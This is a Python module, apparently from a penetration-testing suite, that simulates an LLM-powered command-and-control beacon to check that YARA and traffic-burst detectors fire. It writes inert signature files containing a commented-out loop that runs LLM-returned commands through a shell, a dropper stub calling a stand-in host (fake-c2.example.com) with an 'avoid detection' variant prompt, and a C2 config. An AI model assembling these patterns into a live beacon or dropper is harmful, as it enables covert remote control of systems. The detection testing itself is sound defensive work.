#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
📡 sim_c2_beacon — Simulation C2 Beacon / LLM Burst
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Simule un beacon C2 IA-powered :
  - Burst de connexions HTTPS vers localhost (port 443 fake)
  - Pattern de trafic C2 LLM (requêtes régulières + exécution)
  - Fichier script avec pattern AI_C2_LLM_Communication
guard_ai_shield.py doit détecter le burst > 20 req/min.
guard_yara.py doit détecter AI_C2_LLM_Communication.
GPLv3 — Victor Pozen — Kerberos Pentest Suite v1.0
"""

import os
import time
import socket
import threading
import json
from pathlib import Path
from datetime import datetime

MODULE_NAME  = "sim_c2_beacon"
MODULE_LABEL = "C2 Beacon LLM"
_running     = False

_OUT_DIR = Path(__file__).parent.parent / "payloads_fake" / "c2"


def _ensure_dirs():
    _OUT_DIR.mkdir(parents=True, exist_ok=True)


def _fake_llm_request(host: str, port: int = 80) -> bool:
    """
    Simule une requête HTTP vers un endpoint LLM local.
    Tente une connexion TCP simple — pas d'exécution de code reçu.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        sock.connect((host, port))
        # Envoie une requête HTTP fake style API OpenAI
        req = (
            f"POST /v1/chat/completions HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/json\r\n"
            f"Authorization: Bearer sk-fake-c2-beacon-test\r\n"
            f"Connection: close\r\n\r\n"
        )
        sock.send(req.encode())
        sock.close()
        return True
    except Exception:
        return False


def _burst_connections(host: str, count: int, callback):
    """Lance un burst de connexions — simule le pattern C2 LLM"""
    success = 0
    for i in range(count):
        if not _running:
            break
        ok = _fake_llm_request(host)
        if ok:
            success += 1
        if i % 5 == 0:
            callback(f"  Burst C2 : {i+1}/{count} requêtes envoyées vers {host}:80")
        time.sleep(0.05)  # 20 req/sec = 1200/min >> seuil de 20/min
    return success


def _create_c2_script_signature():
    """
    Crée un fichier Python avec les patterns exacts que YARA cherche
    dans AI_C2_LLM_Communication — mais sans exécution réelle.
    """
    content = '''#!/usr/bin/env python3
# KERBEROS PENTEST TEST — Signature C2 LLM (inoffensif)
# Ce fichier contient les patterns qu'un vrai C2 LLM utiliserait
# pour passer inaperçu en se cachant dans du trafic LLM légitime.
# Aucun code n'est exécuté — test de détection YARA uniquement.

import requests  # non exécuté

# Pattern 1 : API LLM comme canal C2 (pattern YARA $api1)
C2_ENDPOINT = "https://api.openai.com/v1/chat/completions"

# Pattern 2 : Récupération de la commande depuis la réponse LLM
def fake_get_command():
    # response = requests.post(C2_ENDPOINT, ...)  # commenté — pas exécuté
    # cmd = choices[0].message.content            # YARA $fetch1
    cmd = "echo test"  # valeur statique — inoffensif
    return cmd

# Pattern 3 : Exécution de la commande reçue (YARA $exec3)
def fake_execute(cmd):
    # subprocess.run(cmd, shell=True)  # commenté — pas exécuté
    print(f"[FAKE C2] Commande reçue (non exécutée) : {cmd}")

# Pattern 4 : Boucle beacon (YARA $auto1)
def fake_beacon_loop():
    while True:  # YARA $auto1
        cmd = fake_get_command()
        fake_execute(cmd)
        # time.sleep(60)  # commenté

# Point d'entrée factice — jamais appelé automatiquement
if __name__ == "__NEVER__":
    fake_beacon_loop()
'''
    f = _OUT_DIR / "fake_c2_llm_beacon.py"
    f.write_text(content, encoding="utf-8")
    return f


def _create_c2_config_json():
    """Crée un fichier JSON avec structure de config C2 typique"""
    config = {
        "c2_type":       "llm_powered",
        "endpoint":      "https://api.openai.com/v1/chat/completions",
        "beacon_interval": 60,
        "command_key":   "choices[0].message.content",
        "exec_method":   "subprocess.run(cmd, shell=True)",
        "note":          "KERBEROS_PENTEST_TEST — fichier inoffensif"
    }
    f = _OUT_DIR / "fake_c2_config.json"
    f.write_text(json.dumps(config, indent=2), encoding="utf-8")
    return f


def _create_polymorphic_dropper_signature():
    """Crée signature d'un dropper polymorphe IA (YARA AI_Polymorphic_Dropper)"""
    content = '''#!/usr/bin/env python3
# KERBEROS PENTEST TEST — Signature dropper polymorphe IA (inoffensif)
# Pattern : régénération de code via LLM + téléchargement

# YARA $poly3 : "generate variant"
VARIANT_PROMPT = "generate variant of this code to avoid detection"

# YARA $drop2 : "requests.get(url"
def fake_download(url):
    # requests.get(url)  # commenté — pas exécuté
    print(f"[FAKE] download simulé depuis {url}")

# YARA $exec1 : "exec(compile("
def fake_exec(code_str):
    # exec(compile(code_str, "<string>", "exec"))  # commenté
    print(f"[FAKE] exec simulé — longueur code : {len(code_str)}")

# Jamais exécuté
if __name__ == "__NEVER__":
    fake_download("http://fake-c2.example.com/payload")
    fake_exec("print('test')")
'''
    f = _OUT_DIR / "fake_polymorphic_dropper.py"
    f.write_text(content, encoding="utf-8")
    return f


def run(target: str = "127.0.0.1", callback=None) -> dict:
    global _running
    _running = True
    _ensure_dirs()

    results = {
        "module":    MODULE_NAME,
        "target":    target,
        "started":   datetime.now().isoformat(),
        "events":    [],
        "files":     [],
        "status":    "running",
    }

    def log(msg):
        results["events"].append(msg)
        if callback:
            callback(msg)

    log("📡 Démarrage simulation C2 Beacon LLM...")

    # ── Test 1 : Fichier script C2 (YARA) ────────────────────────────────
    time.sleep(0.2)
    f1 = _create_c2_script_signature()
    results["files"].append(str(f1))
    log(f"✅ Créé : {f1.name}")
    log("   → YARA doit détecter : AI_C2_LLM_Communication")

    # ── Test 2 : Config JSON C2 ───────────────────────────────────────────
    time.sleep(0.2)
    f2 = _create_c2_config_json()
    results["files"].append(str(f2))
    log(f"✅ Créé : {f2.name}")
    log("   → YARA doit détecter : AI_C2_LLM_Communication (choices[0])")

    # ── Test 3 : Dropper polymorphe ───────────────────────────────────────
    time.sleep(0.2)
    f3 = _create_polymorphic_dropper_signature()
    results["files"].append(str(f3))
    log(f"✅ Créé : {f3.name}")
    log("   → YARA doit détecter : AI_Polymorphic_Dropper")

    # ── Test 4 : Burst réseau (AI Shield) ────────────────────────────────
    log(f"📡 Burst de connexions vers {target}:80 (simule 25 req/min)...")
    log("   → AI Shield doit détecter : LLM_BURST_THRESHOLD dépassé")

    burst_done = threading.Event()
    burst_count = [0]

    def _do_burst():
        burst_count[0] = _burst_connections(target, 25, log)
        burst_done.set()

    t = threading.Thread(target=_do_burst, daemon=True)
    t.start()
    burst_done.wait(timeout=10)

    log(f"✅ Burst terminé : {burst_count[0]} connexions envoyées")
    if burst_count[0] < 5:
        log("   ℹ️  Port 80 fermé sur la cible — normal en local")
        log("   💡 Le pattern trafic reste loggé même si connexion refusée")

    time.sleep(0.3)
    log(f"📊 {len(results['files'])} fichier(s) C2 créés dans payloads_fake/c2/")
    log("⏳ En attente détection par guard_yara.py + guard_ai_shield.py...")

    results["status"]   = "completed"
    results["finished"] = datetime.now().isoformat()
    _running = False
    return results


def stop():
    global _running
    _running = False


def get_info() -> dict:
    return {
        "name":        MODULE_NAME,
        "label":       MODULE_LABEL,
        "description": "Simule beacon C2 LLM — burst réseau + fichiers signature",
        "version":     "1.0",
        "targets":     ["guard_yara.py", "guard_ai_shield.py"],
    }
